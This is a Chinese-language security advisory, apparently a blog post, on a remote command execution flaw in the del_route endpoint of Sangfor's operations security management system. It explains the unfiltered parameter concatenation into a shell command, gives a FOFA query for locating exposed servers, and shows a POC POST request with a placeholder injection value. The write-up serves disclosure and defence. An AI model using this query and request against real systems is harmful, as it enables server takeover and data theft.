---
title: "深信服运维安全管理系统 del_route 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html
asset_dir: assets/深信服运维安全管理系统-del_route-远程命令执行漏洞
---

# 深信服运维安全管理系统 del\_route 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/4 08:35
- 328浏览
- [0评论](#comment)
- 7分钟阅读

深入探索

软件

SQL

服务器

---

# 漏洞简介

深信服运维安全管理系统 del\_route 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

安全工具开发

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"
>
> 网络

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#del_route`的实现逻辑

[![深信服运维安全管理系统 del_route 远程命令执行漏洞](images/img-001-ba2159d7866b.webp)](https://image.mrxn.net/d2f278860dac4401af7f7f526156dc43.webp)

两个参数**networks**与**netmasks**被直接拼接在**cmd**中，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞（两个参数均存在命令执行漏洞）。

漏洞预警服务

# 漏洞复现

[![深信服运维安全管理系统 del_route 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以ethnum为例
>
> 计算机服务器

```
POST /fort/system;help/netConfig/del_route HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

ipv=4&flags=UG&gateways=1.1.1.1&networks=RCE_POC&netmasks=255.255.255.0
```

访问命令执行结果文件

[![深信服运维安全管理系统 del_route 远程命令执行漏洞](images/img-003-0b23d03927e6.webp)](https://image.mrxn.net/6be82ea82f8942db9da0c91608eb5acc.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
